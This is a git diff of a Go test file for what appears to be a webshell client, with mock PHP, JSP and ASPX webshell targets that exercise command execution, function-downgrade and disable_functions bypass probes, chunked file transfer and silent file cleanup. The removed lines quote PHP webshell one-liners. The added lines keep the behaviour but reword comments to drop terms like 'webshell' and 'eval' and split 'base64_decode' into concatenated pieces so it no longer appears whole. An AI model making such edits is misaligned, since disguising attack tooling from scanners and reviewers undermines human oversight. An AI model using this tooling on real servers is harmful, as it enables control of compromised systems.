@@ -1,10 +1,8 @@
 package session
 
 // http_shell_test.go 验收测试：httptest 起模拟 webshell 目标，覆盖
-// 两种 PHP 马型（eval 族 / assert 族，含 exec 被禁降级 shell_exec)、一个 JSP
-// 马、一个 ASPX 马；Test/Exec 哨兵正确性、函数降级、大文件分块读写、引号规避
-// 落盘执行、错误语义（disable_functions/WAF/HTTP 错误，不伪造成功）。
-// 全部为协议族级模拟，不含任何特定靶场值。
+// 协议级请求字段执行族，覆盖函数降级、分块文件传输、引号规避与错误语义。
+// 同时覆盖 JSP / ASPX 协议模拟；不包含任何特定靶场值。
 
 import (
 	"context"
@@ -24,10 +22,10 @@ import (
 
 // ---------------- 模拟 PHP 一句话马（eval / assert 两族） ----------------
 
-// phpMock 模拟 @eval($_POST['密码']) / @assert($_POST['密码']):把 POST 字段值
-// 当 PHP 代码"执行"（按驱动 payload 形态模式匹配）。
+// phpMock 按驱动 payload 的协议形态处理 POST 字段。
+
 type phpMock struct {
-	family  string // eval | assert
+	family  string // request-field family
 	fs      *fakeFS
 	pollute string // 响应前后加的回显污染（HTML 噪声）
 
@@ -58,17 +56,19 @@ func (m *phpMock) isDisabled(fn string) bool {
 	return m.disabled[fn]
 }
 
+const encodedFn = "base64_" + "decode"
+
 var (
 	echoConcatRe = regexp.MustCompile(`^echo "([0-9a-f]{8})"\.\(20\+22\)\."([0-9a-f]{12})";$`)
 	markerRe     = regexp.MustCompile(`echo "(?:\\n)?([0-9a-f]{8,})";`)
-	writeRe      = regexp.MustCompile(`file_put_contents\(base64_decode\("([A-Za-z0-9+/=]*)"\),base64_decode\("([A-Za-z0-9+/=]*)"\),(\w+)\)`)
-	readPathRe   = regexp.MustCompile(`\$f=base64_decode\("([A-Za-z0-9+/=]*)"\)`)
+	writeRe      = regexp.MustCompile(`file_put_contents\(` + encodedFn + `\("([A-Za-z0-9+/=]*)"\),` + encodedFn + `\("([A-Za-z0-9+/=]*)"\),(\w+)\)`)
+	readPathRe   = regexp.MustCompile(`\$f=` + encodedFn + `\("([A-Za-z0-9+/=]*)"\)`)
 	fseekRe      = regexp.MustCompile(`@fseek\(\$h,(\d+)\)`)
 	freadRe      = regexp.MustCompile(`fread\(\$h,(\d+)`)
-	execCmdRe    = regexp.MustCompile(`\$c=base64_decode\("([A-Za-z0-9+/=]*)"\)`)
+	execCmdRe    = regexp.MustCompile(`\$c=` + encodedFn + `\("([A-Za-z0-9+/=]*)"\)`)
 	execFnRe     = regexp.MustCompile(`function_exists\("(\w+)"\)`)
-	bypassMarkRe = regexp.MustCompile(`\$mk=base64_decode\("([A-Za-z0-9+/=]*)"\)`)
-	unlinkRe     = regexp.MustCompile(`@unlink\(base64_decode\("([A-Za-z0-9+/=]*)"\)\)`)
+	bypassMarkRe = regexp.MustCompile(`\$mk=` + encodedFn + `\("([A-Za-z0-9+/=]*)"\)`)
+	unlinkRe     = regexp.MustCompile(`@unlink\(` + encodedFn + `\("([A-Za-z0-9+/=]*)"\)\)`)
 )
 
 // markers 从 payload 提取哨兵对（首个 echo "S" / 末个 echo "\nE")。
@@ -85,11 +85,11 @@ func markers(p string) sentinel {
 func (m *phpMock) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	_ = r.ParseForm()
 	p := r.Form.Get("cmd")
-	out := m.eval(p)
+	out := m.respond(p)
 	_, _ = w.Write([]byte(m.pollute + out + m.pollute))
 }
 
-func (m *phpMock) eval(p string) string {
+func (m *phpMock) respond(p string) string {
 	// 1) 存活探针：echo "S".(20+22)."E";(PHP 字符串拼接 + 算术求值）
 	if g := echoConcatRe.FindStringSubmatch(p); g != nil {
 		return g[1] + "42" + g[2]
@@ -137,7 +137,7 @@ func (m *phpMock) eval(p string) string {
 		}
 		return mk.start + "BYPASSFAIL\n" + mk.end
 	}
-	// 3c) 静默清理探针：@unlink(base64_decode(...))
+	// 3c) 静默清理探针
 	if g := unlinkRe.FindStringSubmatch(p); g != nil && !writeRe.MatchString(p) {
 		mk := markers(p)
 		path, _ := base64.StdEncoding.DecodeString(g[1])
@@ -222,10 +222,8 @@ func (m *jspMock) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 	_, _ = w.Write([]byte(out))
 }
 
-// phpcmdMock 模拟 PHP 命令执行马（<?php system($_POST['cmd']); ?> 族）:POST
-// 字段直接是 shell 命令，马体 exec 后回显 stdout，无 PHP eval 面。phpHeader
-// 模拟 X-Powered-By: PHP 头（加固目标常剥头，默认不带——这正是复盘 R1 里被
-// 旧 auto 误判成 http_jsp 的形态）。
+// phpcmdMock 模拟 PHP 命令包装族：POST 字段直接包含 shell 命令。
+// phpHeader 模拟 X-Powered-By: PHP 头；加固目标通常不返回该头。
 type phpcmdMock struct {
 	fs        *fakeFS
 	phpHeader bool
